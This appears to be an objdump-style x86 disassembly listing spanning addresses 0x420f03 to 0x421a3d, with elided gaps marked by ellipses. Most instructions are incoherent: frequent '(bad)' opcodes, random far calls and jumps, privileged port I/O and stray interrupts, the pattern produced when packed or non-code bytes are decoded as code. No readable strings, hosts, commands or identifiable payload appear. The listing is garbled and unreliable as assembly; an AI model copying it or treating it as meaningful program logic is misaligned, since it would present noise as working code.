  420f03:	and    al,bh
  420f05:	sub    eax,0x869b649a
  420f0a:	push   edx
  420f0b:	xor    ah,BYTE PTR [ebp+0x78]
  420f0e:	scas   al,BYTE PTR es:[edi]
  420f0f:	(bad)  
  420f10:	cmp    al,0x0
	...
  420f72:	add    BYTE PTR [eax],al
  420f74:	and    BYTE PTR [edi-0x28082cbe],dl
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0x26491db9]
  420f84:	xchg   ebx,eax
  420f85:	pop    edi
  420f86:	add    DWORD PTR [eax],eax
  420f88:	add    eax,0x97000001
  420f8d:	mov    dh,0xc0
  420f8f:	dec    esi
  420f90:	dec    ebx
  420f91:	push   eax
  420f92:	push   esp
  420f93:	neg    BYTE PTR [edi]
  420f95:	(bad)
  420f98:	adc    BYTE PTR [edi+0xa],al
  420f9b:	test   ecx,0x16bc0474
  420fa1:	push   es
  420fa2:	loop   0x42101a
  420fa4:	adc    DWORD PTR [edx-0x44c2c6fd],eax
  420faa:	je     0x420fe4
  420fac:	xchg   edx,eax
  420fad:	jge    0x420f5f
  420faf:	icebp  
  420fb0:	cmp    BYTE PTR [ebx],ch
  420fb2:	inc    ecx
  420fb3:	mov    al,ds:0xa0c30eec
  420fb8:	leave  
  420fb9:	jmp    0x618ae6e1
  420fbe:	jle    0x42102c
  420fc0:	loop   0x420f42
  420fc2:	cmp    ecx,DWORD PTR [ebx+0x63d2f9b0]
  420fc8:	int    0x55
  420fca:	mov    eax,0x9740d10c
  420fcf:	imul   ecx,DWORD PTR [edx+0x42efe9c],0xc9c0988a
  420fd9:	(bad)  
  420fda:	push   ebx
  420fdb:	adc    esi,ebx
  420fdd:	fisttp DWORD PTR [edx]
  420fdf:	sti    
  420fe0:	or     dl,bl
  420fe2:	into   
  420fe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fe4:	or     DWORD PTR [edi+0x7a],0x87b356d7
  420feb:	paddusw mm3,mm5
  420fee:	xchg   edx,eax
  420fef:	bound  ebp,QWORD PTR [ebx+0x55]
  420ff2:	mov    al,0x36
  420ff4:	int    0x7c
  420ff6:	(bad)  
  420ff7:	enter  0x2e02,0xd7
  420ffb:	lahf   
  420ffc:	cmp    ah,0x88
  420fff:	xchg   edx,eax
  421000:	lds    edi,FWORD PTR [edx+0x326699e2]
  421006:	aad    0xa7
  421008:	mov    bl,0xa1
  42100a:	lock aam 0x7b
  42100d:	retf   0xab7a
  421010:	xor    al,0xe0
  421012:	xchg   edi,eax
  421013:	(bad)  
  421014:	adc    al,0x89
  421016:	in     eax,dx
  421017:	in     eax,dx
  421018:	cs jp  0x420fae
  42101b:	clc    
  42101c:	cmp    al,0x8d
  42101e:	pop    edi
  42101f:	fistp  WORD PTR [edi+0x6e]
  421022:	cmp    dh,BYTE PTR [edi+0x7c]
  421025:	adc    al,0x72
  421027:	cmp    cl,BYTE PTR [edi]
  421029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42102a:	pop    eax
  42102b:	dec    ecx
  42102c:	adc    al,0x15
  42102e:	push   eax
  42102f:	jns    0x4210a9
  421031:	shr    BYTE PTR [ebx+0x29],cl
  421034:	hlt    
  421035:	aam    0x9f
  421037:	adc    esp,ebp
  421039:	jns    0x4210b5
  42103b:	ins    BYTE PTR es:[edi],dx
  42103c:	mov    ds:0xfeb2cedb,eax
  421041:	popa   
  421042:	add    edx,DWORD PTR [eax-0x11]
  421045:	sbb    DWORD PTR [edi-0x434233f6],esp
  42104b:	stc    
  42104c:	rcr    DWORD PTR [esi-0x451d787f],1
  421052:	jbe    0x421046
  421054:	nop
  421055:	xor    BYTE PTR ds:0x106cbbf,0xcb
  42105c:	out    dx,eax
  42105d:	push   0x8235daae
  421062:	shl    BYTE PTR [ecx-0x4d],1
  421065:	punpckldq mm2,DWORD PTR [edi+0x35]
  421069:	aaa    
  42106a:	jmp    0x42107d
  42106c:	pop    ds
  42106d:	mov    ah,0xc8
  42106f:	or     eax,0xcb831f5a
  421074:	(bad)  
  421075:	cmp    BYTE PTR [edx-0xd27821e],al
  42107b:	shl    bl,1
  42107d:	mov    al,ds:0x93454196
  421082:	mov    eax,0x40b3546a
  421087:	mov    BYTE PTR [edx],ah
  421089:	pop    edi
  42108a:	jbe    0x42108b
  42108c:	in     al,dx
  42108d:	out    0xd5,eax
  42108f:	sbb    eax,0x9d
	...
  4210f4:	lahf   
  4210f5:	pop    esi
  4210f6:	fcmovb st,st(6)
  4210f8:	fcmovnb st,st(6)
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    es,WORD PTR [ecx]
  421101:	lahf   
  421102:	aaa    
  421103:	adc    ebx,DWORD PTR [eax+0x5000160]
  421109:	add    DWORD PTR [eax],eax
  42110b:	add    bh,dl
  42110d:	sbb    eax,esi
  42110f:	fsubr  QWORD PTR [eax]
  421111:	dec    eax
  421112:	rcl    BYTE PTR [ecx+0x27],0x99
  421116:	inc    eax
  421117:	jg     0x421163
  421119:	jmp    0x421167
  42111b:	xchg   BYTE PTR [ebx+0xb],ch
  42111e:	test   DWORD PTR [edx-0x1a],esp
  421121:	shr    BYTE PTR [eax],cl
  421123:	cwde   
  421124:	xchg   ebx,eax
  421125:	mov    esi,0x8ac82a26
  42112a:	jae    0x421157
  42112c:	sub    bl,al
  42112e:	popa   
  42112f:	mov    bl,al
  421131:	add    al,0x28
  421133:	cmp    eax,0xe469bd6f
  421138:	sbb    esp,DWORD PTR [edx-0x3f]
  42113b:	jnp    0x4210c5
  42113d:	fiadd  DWORD PTR [eax+eiz*2+0x3c151bff]
  421144:	imul   esi,DWORD PTR [edi+0x74708e24],0x292a7d09
  42114e:	rcr    DWORD PTR [ebp+0x2321bd4e],0x2e
  421155:	pop    es
  421156:	jo     0x421178
  421158:	add    al,0x22
  42115a:	(bad)  [ebx-0x102ee828]
  421160:	fs (bad) 
  421162:	mov    eax,ds:0x7aeeb871
  421167:	imul   ebx,DWORD PTR [ecx],0x2e20bdbb
  42116d:	pop    ecx
  42116e:	pop    ebx
  42116f:	xchg   edi,eax
  421170:	mov    dl,dl
  421172:	out    dx,al
  421173:	imul   ebx,ebp,0xffffffa8
  421176:	and    ebp,esp
  421178:	jo     0x421168
  42117a:	leave  
  42117b:	adc    eax,0xb9a9ee9a
  421180:	test   BYTE PTR [esi],bh
  421182:	fmul   st,st(3)
  421184:	pop    ss
  421185:	out    dx,eax
  421186:	cmp    esi,DWORD PTR [ebx-0x25]
  421189:	adc    al,0xe1
  42118b:	xor    esi,DWORD PTR [edi]
  42118d:	pop    ecx
  42118e:	mov    al,ds:0xa83a28e3
  421193:	fadd   st(3),st
  421195:	add    BYTE PTR [eax+0x1193f783],0xae
  42119c:	jbe    0x42112f
  42119e:	mov    edx,0x75e2201c
  4211a3:	sbb    ecx,ebp
  4211a5:	sub    al,0x54
  4211a7:	xchg   esp,eax
  4211a8:	fucomp st(1)
  4211aa:	jb     0x421149
  4211ac:	cli    
  4211ad:	or     BYTE PTR [ebp+0x43],ah
  4211b0:	jge    0x42113f
  4211b2:	xor    BYTE PTR [esi+0x62],cl
  4211b5:	test   BYTE PTR [edi+0x19055b45],al
  4211bb:	(bad)  
  4211bc:	jnp    0x4211a8
  4211be:	add    ch,BYTE PTR [eax+0x75]
  4211c1:	mov    dh,0x77
  4211c3:	and    ebp,DWORD PTR [eax+0x31]
  4211c6:	dec    ecx
  4211c7:	cli    
  4211c8:	mov    esp,0xe7cb2567
  4211cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211ce:	or     DWORD PTR [eax-0x59276ba2],edx
  4211d4:	stos   BYTE PTR es:[edi],al
  4211d5:	lock mov ch,0xa9
  4211d8:	test   DWORD PTR [edi+0x4a],esi
  4211db:	sahf   
  4211dc:	mov    dh,0x1a
  4211de:	ins    BYTE PTR es:[edi],dx
  4211df:	sbb    BYTE PTR [ecx-0x60],bh
  4211e2:	cmp    DWORD PTR [ebp-0x519e5ffe],0xffffffbc
  4211e9:	push   edx
  4211ea:	cmp    eax,0xc5c8647a
  4211ef:	mov    eax,ds:0x69130e0e
  4211f4:	outs   dx,BYTE PTR ds:[esi]
  4211f5:	or     eax,0x96719ccc
  4211fa:	stc    
  4211fb:	lea    edi,[edx-0x5c]
  4211fe:	mov    ds:0x46b4bec1,al
  421203:	inc    eax
  421204:	or     ah,cl
  421206:	inc    edx
  421207:	cli    
  421208:	stos   BYTE PTR es:[edi],al
  421209:	xchg   ebp,eax
  42120a:	call   0x6745:0xd0dfdb2c
	...
  421271:	add    BYTE PTR [eax],al
  421273:	add    BYTE PTR [esi-0x700870e1],bl
  421279:	idiv   esi
  42127b:	jg     0x42123a
  42127d:	sub    eax,0x52be7ab3
  421282:	nop
  421283:	sbb    DWORD PTR [ebp+0x5000161],0x1
  42128a:	add    BYTE PTR [eax],al
  42128c:	fdiv   st(5),st
  42128e:	call   0xe8c2af1d
  421293:	jp     0x42127f
  421295:	aas    
  421296:	mov    edx,0x5c59a124
  42129b:	mov    eax,ds:0x3df7fad0
  4212a0:	sub    ah,BYTE PTR [ecx+0x3cd1d66c]
  4212a6:	stos   DWORD PTR es:[edi],eax
  4212a7:	inc    ebx
  4212a8:	cs sti 
  4212aa:	cmp    eax,DWORD PTR [esi]
  4212ac:	aaa    
  4212ad:	aam    0xfe
  4212af:	xchg   ebx,eax
  4212b0:	jb     0x4212df
  4212b2:	xor    eax,0x3e862a49
  4212b7:	div    BYTE PTR [esi+0x64c23447]
  4212bd:	call   0x36a3:0xb47ec0a6
  4212c4:	rcl    bl,0xdd
  4212c7:	or     al,0x82
  4212c9:	xor    esi,0x7d
  4212cc:	push   esp
  4212cd:	jge    0x4212e8
  4212cf:	sbb    DWORD PTR [esi-0x6e179f90],0xffffffcf
  4212d6:	stc    
  4212d7:	lock sub al,0x35
  4212da:	mov    ebx,0xc44151e5
  4212df:	add    ebp,DWORD PTR [ebx-0x4fde962e]
  4212e5:	fsubr  DWORD PTR [edx+0x4d]
  4212e8:	(bad)  
  4212e9:	push   eax
  4212ea:	ins    DWORD PTR es:[edi],dx
  4212eb:	mov    ah,0xd
  4212ed:	sbb    eax,0xadebaada
  4212f2:	das    
  4212f3:	jmp    0x4212fa
  4212f5:	aam    0x61
  4212f7:	(bad)  
  4212f8:	out    0x2d,eax
  4212fa:	or     BYTE PTR [bp+di-0x79],ah
  4212fe:	pop    ss
  4212ff:	or     ebx,DWORD PTR [ebx-0x54044347]
  421305:	mov    bh,0xc9
  421307:	or     DWORD PTR [ebx-0xb2bc056],edx
  42130d:	scas   eax,DWORD PTR es:[edi]
  42130e:	jbe    0x42137e
  421310:	arpl   WORD PTR [edx],sp
  421312:	fst    st(6)
  421314:	stos   BYTE PTR es:[edi],al
  421315:	sub    al,0x70
  421317:	jmp    0x42136f
  421319:	adc    eax,0xfa1e244
  42131e:	sub    al,0xd3
  421320:	neg    DWORD PTR [ebx+0x47a24430]
  421326:	call   0xc830:0x470cea0b
  42132d:	adc    al,0x5
  42132f:	loop   0x421384
  421331:	push   ss
  421332:	popa   
  421333:	cmc    
  421334:	mov    WORD PTR [esp+edi*4+0x795540dd],?
  42133b:	aam    0x64
  42133d:	out    dx,al
  42133e:	add    al,0xd1
  421340:	loope  0x421321
  421342:	icebp  
  421343:	ret    0xa5b0
  421346:	jo     0x42132b
  421348:	xchg   ebp,eax
  421349:	xchg   edi,eax
  42134a:	sbb    BYTE PTR [edi+0x56],bh
  42134d:	inc    edi
  42134e:	jnp    0x42137e
  421350:	lods   eax,DWORD PTR ds:[esi]
  421351:	daa    
  421352:	dec    esp
  421353:	adc    bh,BYTE PTR [edx-0x1b]
  421356:	push   esi
  421357:	shl    bl,1
  421359:	adc    al,0xa7
  42135b:	lahf   
  42135c:	loop   0x421370
  42135e:	aas    
  42135f:	frstor [ebx-0x1121a1b6]
  421365:	mov    esp,0x791015cc
  42136a:	sub    al,0x19
  42136c:	push   esp
  42136d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42136e:	inc    ebp
  42136f:	bswap  ebp
  421371:	test   al,0x92
  421373:	pop    ecx
  421374:	hlt    
  421375:	add    eax,DWORD PTR [ebx]
  421377:	mov    al,ds:0x1ea34077
  42137c:	(bad)  
  42137d:	rcl    DWORD PTR [ebx+eiz*2+0x32],cl
  421381:	and    BYTE PTR [ebx-0x5c0f0e55],al
  421387:	ins    DWORD PTR es:[edi],dx
  421388:	loopne 0x42138d
  42138a:	addr16 lahf 
  42138c:	add    al,0xa1
  42138e:	add    bh,ah
  421390:	mov    dh,0x0
	...
  4213f2:	add    BYTE PTR [eax],al
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp-0x25050b61]
  421402:	xor    eax,0x162a29a
  421407:	add    BYTE PTR ds:0x96000001,al
  42140d:	sbb    bl,ah
  42140f:	pop    ecx
  421410:	fstp   QWORD PTR [esi+0x3]
  421413:	adc    esi,edx
  421415:	jnp    0x421455
  421417:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421418:	into   
  421419:	popa   
  42141a:	outs   dx,BYTE PTR ds:[esi]
  42141b:	push   ebx
  42141c:	imul   edi,DWORD PTR [edx-0xae3fc38],0x7f70ae21
  421426:	fwait
  421427:	push   cs
  421428:	lahf   
  421429:	jmp    0xcc21:0xb0b821d8
  421430:	out    dx,eax
  421431:	dec    eax
  421432:	addr16 sti 
  421434:	mov    ah,BYTE PTR gs:[esi]
  421437:	aaa    
  421438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421439:	mov    esi,0x68946835
  42143e:	xchg   edx,eax
  42143f:	fnstenv [esi]
  421441:	sub    eax,DWORD PTR [edi+0x1b8c1f4c]
  421447:	dec    ecx
  421448:	push   ebp
  421449:	in     eax,0xf0
  42144b:	and    edx,DWORD PTR [edi]
  42144d:	jns    0x421428
  42144f:	pop    edi
  421450:	and    al,0xa2
  421452:	pop    esi
  421453:	add    edi,ecx
  421455:	stos   BYTE PTR es:[edi],al
  421456:	mov    WORD PTR [edi+0x5d76e5a6],ss
  42145c:	and    esi,DWORD PTR [eax-0x55]
  42145f:	pop    edx
  421460:	loop   0x421430
  421462:	iret   
  421463:	out    dx,al
  421464:	push   es
  421465:	jmp    0xc8bd2eb1
  42146a:	fwait
  42146b:	call   0x92f0251
  421470:	mov    ebp,edi
  421472:	repnz mov ebx,0x76f156a2
  421478:	inc    esi
  421479:	push   es
  42147a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42147b:	retf   0x752d
  42147e:	jmp    0x421463
  421480:	data16 jmp 0x421445
  421483:	ficom  WORD PTR [edx+0x681a163a]
  421489:	mov    DWORD PTR [esi-0x7b2259c0],ebp
  42148f:	test   al,0x58
  421491:	sbb    DWORD PTR [edx-0x6d22c7dc],ecx
  421497:	cld    
  421498:	mov    bh,0xb9
  42149a:	mov    esp,0xac714802
  42149f:	call   0x7ab34d77
  4214a4:	and    esi,DWORD PTR [edx]
  4214a6:	test   eax,0xfcdc2fdc
  4214ab:	rcr    edi,cl
  4214ad:	xchg   BYTE PTR [eax-0x5e],ch
  4214b0:	icebp  
  4214b1:	call   0x145baf9b
  4214b6:	jns    0x4214d2
  4214b8:	cdq    
  4214b9:	stos   BYTE PTR es:[edi],al
  4214ba:	mov    ebp,0x84dd29d6
  4214bf:	(bad)  
  4214c0:	mov    ds:0x3767b49e,eax
  4214c5:	sbb    eax,0x9341e2b
  4214ca:	inc    DWORD PTR es:0xd0cb04
  4214d1:	and    DWORD PTR [edi],eax
  4214d3:	popf   
  4214d4:	pop    eax
  4214d5:	shl    DWORD PTR [ecx+ebx*2],1
  4214d8:	adc    al,0xa4
  4214da:	pop    edx
  4214db:	pop    ss
  4214dc:	pop    ds
  4214dd:	jae    0x421478
  4214df:	test   al,0xb7
  4214e1:	outs   dx,BYTE PTR ds:[esi]
  4214e2:	arpl   WORD PTR [esi-0x44],bp
  4214e5:	js     0x42146f
  4214e7:	test   eax,0xc4499b60
  4214ec:	xchg   esi,eax
  4214ed:	pop    esp
  4214ee:	mov    esp,0xe65b13fc
  4214f3:	xchg   BYTE PTR [eax+ebp*1+0x331b6e4e],dl
  4214fa:	mov    eax,ds:0xb6a8ce02
  4214ff:	mov    ecx,0x923e9389
  421504:	add    dl,BYTE PTR [edx-0x13]
  421507:	mov    esp,0xe09101e3
  42150c:	jl     0x4214e3
  42150e:	leave  
  42150f:	outs   dx,BYTE PTR ds:[esi]
	...
  421571:	add    BYTE PTR [eax],al
  421573:	add    dh,dl
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax+0x576842b4],bp
  421582:	xor    eax,0x163a713
  421587:	add    BYTE PTR ds:0xf6000001,al
  42158d:	mov    esi,0xc113206b
  421592:	mov    al,0xc5
  421594:	adc    dh,BYTE PTR [edx-0x6b]
  421597:	popf   
  421598:	xor    DWORD PTR [ebx+0x62],eax
  42159b:	xchg   DWORD PTR [esi],edi
  42159d:	stos   BYTE PTR es:[edi],al
  42159e:	sar    BYTE PTR [ebp-0x4821c83f],cl
  4215a4:	xor    al,BYTE PTR [edi]
  4215a6:	xor    esp,DWORD PTR [edx]
  4215a8:	xchg   esi,esp
  4215aa:	addr16 cmp eax,0xcca374d
  4215b0:	xchg   ebp,eax
  4215b1:	or     DWORD PTR [edx+0x1be65c6b],0x92c780c3
  4215bb:	scas   al,BYTE PTR es:[edi]
  4215bc:	aad    0x7e
  4215be:	aaa    
  4215bf:	nop
  4215c0:	sbb    al,0x83
  4215c2:	adc    eax,0x251c6032
  4215c7:	add    DWORD PTR [esi+0x12],edx
  4215ca:	shl    BYTE PTR [ebx],1
  4215cc:	mov    eax,ds:0xfb2cc28b
  4215d1:	popa   
  4215d2:	xchg   ecx,eax
  4215d3:	aas    
  4215d4:	inc    ebp
  4215d5:	imul   edx
  4215d7:	mov    edi,tr2
  4215da:	imul   eax,DWORD PTR [ebx],0x45
  4215dd:	jecxz  0x4215e7
  4215df:	retf   0x657b
  4215e2:	sbb    DWORD PTR [ecx+0x5670fef5],ebp
  4215e8:	ret    0x7f7a
  4215eb:	pop    ds
  4215ec:	in     al,0x4d
  4215ee:	dec    esp
  4215ef:	imul   DWORD PTR [ebx]
  4215f1:	adc    eax,DWORD PTR [ecx+0x61]
  4215f4:	sbb    DWORD PTR ds:0x23d4a92a,ecx
  4215fa:	push   esi
  4215fb:	cmp    edx,esi
  4215fd:	push   es
  4215fe:	push   esp
  4215ff:	dec    edx
  421600:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421601:	pusha  
  421602:	ret    
  421603:	inc    esp
  421604:	scas   al,BYTE PTR es:[edi]
  421605:	sbb    BYTE PTR [ecx],cl
  421607:	or     BYTE PTR [ebp+0x16],0x2d
  42160b:	in     eax,0x16
  42160d:	add    al,0x47
  42160f:	or     esi,DWORD PTR [edi+0x7]
  421612:	mov    ebx,0xf50442d2
  421617:	enter  0xe190,0x30
  42161b:	sbb    BYTE PTR [esi],cl
  42161d:	ins    DWORD PTR es:[edi],dx
  42161e:	pop    esi
  42161f:	xchg   ebx,eax
  421620:	inc    BYTE PTR [edi+0x780b07f6]
  421626:	adc    BYTE PTR [eax+0x3d1eddc0],ch
  42162c:	ret    
  42162d:	bnd jo 0x42160a
  421630:	out    dx,al
  421631:	mov    edi,0xb30707a8
  421636:	mov    eax,0x400918cd
  42163b:	and    DWORD PTR [ebx+0x39],esp
  42163e:	je     0x42163a
  421640:	scas   al,BYTE PTR es:[edi]
  421641:	inc    ebx
  421642:	fisttp QWORD PTR [edx-0x39]
  421645:	jmp    0x4084:0x1690e557
  42164c:	(bad)  
  42164d:	mov    esi,0xd317913b
  421652:	fadd   DWORD PTR [esp+ebp*4-0x79]
  421656:	mov    edx,0x7a79b5cf
  42165b:	xor    ecx,DWORD PTR [ecx]
  42165d:	das    
  42165e:	jmp    0x421625
  421660:	int3   
  421661:	jg     0x421625
  421663:	mov    esp,DWORD PTR [esi-0x1576693d]
  421669:	jg     0x42165f
  42166b:	fisubr WORD PTR [eax]
  42166d:	loop   0x421645
  42166f:	sub    al,0xb6
  421671:	pop    es
  421672:	pop    es
  421673:	jbe    0x42166b
  421675:	cld    
  421676:	inc    eax
  421677:	xor    al,0xf2
  421679:	ja     0x421649
  42167b:	mov    ebx,0x2529afc6
  421680:	aam    0x6d
  421682:	jmp    0x42169f
  421684:	int    0x28
  421686:	xchg   DWORD PTR [edi+0x3d0d4935],ebx
  42168c:	jmp    0x0:0x13c74457
	...
  4216f3:	add    BYTE PTR [ebx-0x105512d4],ch
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	pop    esi
  421701:	xor    edx,DWORD PTR [ebx-0x3c]
  421704:	lods   al,BYTE PTR ds:[esi]
  421705:	add    DWORD PTR fs:[eax],eax
  421708:	add    eax,0x9000001
  42170d:	gs cmp eax,0x2405f2d5
  421713:	shl    DWORD PTR [bx+si],0x70
  421717:	movzx  esp,WORD PTR [ecx]
  42171a:	stc    
  42171b:	sub    al,0x85
  42171d:	xchg   BYTE PTR [ebp+0x7a],ch
  421720:	mov    bh,0x82
  421722:	repnz call 0xd986:0x93ad480e
  42172a:	pushf  
  42172b:	shl    dl,cl
  42172d:	cwde   
  42172e:	mov    BYTE PTR [eax+0x63],dl
  421731:	xor    ch,ch
  421733:	pushf  
  421734:	pop    eax
  421735:	add    DWORD PTR [ecx-0x757ff592],0x35f284cf
  42173f:	push   ebp
  421740:	sar    BYTE PTR [ebx-0x48d387f5],1
  421746:	fnstsw WORD PTR [ecx-0x179403b5]
  42174c:	sahf   
  42174d:	mov    bl,dh
  42174f:	cld    
  421750:	pop    esi
  421751:	and    BYTE PTR [ebp+0x5e5b7f08],al
  421757:	inc    esi
  421758:	dec    eax
  421759:	or     DWORD PTR [eax-0x68681242],edi
  42175f:	inc    ebp
  421760:	mov    ebp,0x7a248cb7
  421765:	outs   dx,DWORD PTR ds:[esi]
  421766:	sar    BYTE PTR [edx-0x6f],0x20
  42176a:	or     al,0x12
  42176c:	mov    al,0x9e
  42176e:	adc    al,cl
  421770:	popf   
  421771:	xor    eax,0x536f804a
  421776:	xor    eax,0x8371b791
  42177b:	pusha  
  42177c:	into   
  42177d:	fwait
  42177e:	sbb    al,0x64
  421780:	push   ds
  421781:	adc    BYTE PTR [ecx+0x437a123d],0xd9
  421788:	xchg   DWORD PTR [ebx],ebp
  42178a:	ja     0x42177e
  42178c:	jle    0x4217d1
  42178e:	and    ah,bh
  421790:	jno    0x4217e1
  421792:	mov    ecx,0xa1e5b9e5
  421797:	ror    esi,cl
  421799:	dec    edx
  42179a:	push   edi
  42179b:	xchg   ebp,eax
  42179c:	(bad)  
  42179d:	daa    
  42179e:	dec    ecx
  42179f:	addr16 cs leave 
  4217a2:	in     al,dx
  4217a3:	dec    esp
  4217a4:	cmc    
  4217a5:	cwde   
  4217a6:	add    ebp,DWORD PTR [eax+ecx*1-0x785225f3]
  4217ad:	mov    esp,0x79d0b348
  4217b2:	daa    
  4217b3:	call   0xcecf:0xcfd3d111
  4217ba:	inc    ebx
  4217bb:	inc    esi
  4217bc:	xor    BYTE PTR [eax-0x3afb2373],ch
  4217c2:	das    
  4217c3:	mov    ch,0x7e
  4217c5:	xor    eax,0x24154eb9
  4217ca:	aas    
  4217cb:	jmp    0xefb7a0c9
  4217d0:	rcl    BYTE PTR [edx+ebp*2-0x70],0x26
  4217d5:	retf   0x31c2
  4217d8:	bound  eax,QWORD PTR [edi+ebp*8-0x3f]
  4217dc:	inc    esp
  4217dd:	dec    ebp
  4217de:	lods   al,BYTE PTR ds:[esi]
  4217df:	dec    eax
  4217e0:	mov    al,ds:0x2bed0c63
  4217e5:	stc    
  4217e6:	(bad)  
  4217e7:	clc    
  4217e8:	loop   0x4217eb
  4217ea:	call   0x9315bd6d
  4217ef:	push   ss
  4217f0:	addr16 gs test dl,dl
  4217f4:	aas    
  4217f5:	sbb    al,0x8d
  4217f7:	adc    DWORD PTR [ebx-0xddef21d],eax
  4217fd:	cmp    BYTE PTR [ebx+edx*2],ch
  421800:	ja     0x421841
  421802:	pop    edi
  421803:	shr    DWORD PTR [edx+0x2f],cl
  421806:	push   edx
  421807:	(bad)  
  421808:	lock jecxz 0x4217a7
  42180b:	popa   
  42180c:	std    
  42180d:	bound  ebp,QWORD PTR [esi+0xea62]
	...
  421873:	add    cl,dl
  421875:	mov    al,ds:0xf9f9e0b9
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	jb     0x4218e7
  421882:	xor    DWORD PTR [edi+0x165b1],ecx
  421888:	add    eax,0xb0000001
  42188d:	sbb    DWORD PTR [ecx],esi
  42188f:	xor    BYTE PTR [esi],bh
  421891:	repz mov cl,0x25
  421894:	sub    cl,ah
  421896:	outs   dx,BYTE PTR ds:[esi]
  421897:	mov    esp,0x5df96d20
  42189c:	daa    
  42189d:	in     eax,dx
  42189e:	sub    edi,DWORD PTR [edx-0x7ef04b05]
  4218a4:	sbb    BYTE PTR ds:0x4f3113df,cl
  4218aa:	push   es
  4218ab:	jbe    0x42183e
  4218ad:	icebp  
  4218ae:	ins    BYTE PTR es:[edi],dx
  4218af:	stos   DWORD PTR es:[edi],eax
  4218b0:	adc    eax,0x3f097421
  4218b5:	dec    esi
  4218b6:	jnp    0x421887
  4218b8:	sbb    eax,DWORD PTR [edx-0x1ac7c20e]
  4218be:	imul   ebp,DWORD PTR cs:[esi-0xbfe6b55],0xffffffa3
  4218c6:	fistp  DWORD PTR [edx+esi*2+0x62]
  4218ca:	rol    DWORD PTR [eax-0x25],1
  4218cd:	gs push ss
  4218cf:	mov    esi,0xd5a4c1be
  4218d4:	dec    eax
  4218d5:	repnz (bad) 
  4218d7:	(bad)  
  4218d8:	icebp  
  4218d9:	sub    al,0xbd
  4218db:	bound  ebp,QWORD PTR [ebx+0x5c]
  4218de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218e0:	or     BYTE PTR [eax-0x18455e88],dh
  4218e6:	adc    BYTE PTR [edi-0xdb75036],ch
  4218ec:	sbb    DWORD PTR [ebx-0x32],edx
  4218ef:	nop    DWORD PTR [eax-0x553c57b7]
  4218f6:	mov    esi,0xd14d7867
  4218fb:	xchg   edi,eax
  4218fc:	ret    0x5301
  4218ff:	ds mov ecx,0xaaa246ff
  421905:	f2xm1  
  421907:	pushf  
  421908:	iret   
  421909:	mov    ebp,0xd2b317b1
  42190e:	cmp    dl,bl
  421910:	imul   ecx,DWORD PTR [esi-0x6e790ae],0xffffffbd
  421917:	mov    eax,0x75a91953
  42191c:	int3   
  42191d:	call   0xaa48:0xb9c0f119
  421924:	jnp    0x42196b
  421926:	xchg   esi,edi
  421928:	call   0x33b526ce
  42192d:	sbb    ebp,DWORD PTR [ecx+0x4e]
  421930:	and    al,0xb
  421932:	fs iret 
  421934:	mov    ss,WORD PTR [edx]
  421936:	(bad)  
  421937:	out    0xeb,eax
  421939:	mov    edi,0xb7d439ea
  42193e:	nop
  42193f:	mov    ah,0xd2
  421941:	clc    
  421942:	and    BYTE PTR [esi+0x76],ah
  421945:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  421947:	ss adc eax,0x73c66bb1
  42194d:	(bad)  
  42194e:	and    ecx,DWORD PTR [ebp+0x2d]
  421951:	push   edi
  421952:	dec    edi
  421953:	popa   
  421954:	test   edx,ecx
  421956:	sti    
  421957:	repnz mov dh,0x3a
  42195a:	cmp    al,0x0
  42195c:	fchs   
  42195e:	or     al,0x8a
  421960:	rcr    DWORD PTR [esi-0xe9ad6a6],cl
  421966:	inc    ecx
  421967:	lods   eax,DWORD PTR ds:[esi]
  421968:	hlt    
  421969:	and    bh,ch
  42196b:	or     dh,BYTE PTR cs:[eax-0x2631f5e1]
  421972:	loopne 0x421902
  421974:	or     edi,DWORD PTR [ebp-0x72]
  421977:	mov    dl,BYTE PTR [ebx]
  421979:	ficom  DWORD PTR [edi+0x4763d728]
  42197f:	test   eax,0xb627e5b4
  421984:	xor    al,0xae
  421986:	test   DWORD PTR [esi-0x643660b6],0xb47a66b6
  421990:	repz add BYTE PTR [eax],al
	...
  4219f3:	add    dh,bh
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	ins    DWORD PTR es:[edi],dx
  421a01:	nop
  421a02:	add    al,BYTE PTR [edi+0x166b6]
  421a08:	add    eax,0xbf000001
  421a0d:	cmp    BYTE PTR [edi+eiz*4],ch
  421a10:	ret    0x7f47
  421a13:	clc    
  421a14:	xadd   edx,ebx
  421a17:	sbb    al,BYTE PTR [ecx+0x6964470c]
  421a1d:	push   ebx
  421a1e:	outs   dx,BYTE PTR ds:[esi]
  421a1f:	xor    BYTE PTR [ecx],0xe
  421a22:	add    BYTE PTR [ebx+0x32],cl
  421a25:	adc    esp,DWORD PTR [eax-0x31]
  421a28:	ja     0x421a6f
  421a2a:	jo     0x4219df
  421a2c:	addr16 out dx,al
  421a2e:	mov    ebx,0x40875ce1
  421a33:	fstp   QWORD PTR [ebx]
  421a35:	jne    0x421ab0
  421a37:	retf   0xef0
  421a3a:	fidivr DWORD PTR [ecx-0xa]
  421a3d:	jnp    0x421aad
